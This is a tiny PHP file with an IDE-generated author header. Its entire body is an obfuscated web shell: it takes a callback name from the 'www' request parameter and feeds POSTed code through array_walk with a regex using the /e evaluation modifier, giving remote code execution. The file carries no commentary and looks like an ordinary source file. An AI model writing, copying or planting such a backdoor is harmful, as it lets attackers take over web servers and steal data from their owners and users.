<?php
/**
 * Created by PhpStorm.
 * User: wenhuizone
 * Date: 2015/12/7
 * Time: 19:58
 */
$e = $_REQUEST["www"];
$arr = array($_POST["wtf"] => "|.*|e");
array_walk($arr, $e, '');

?>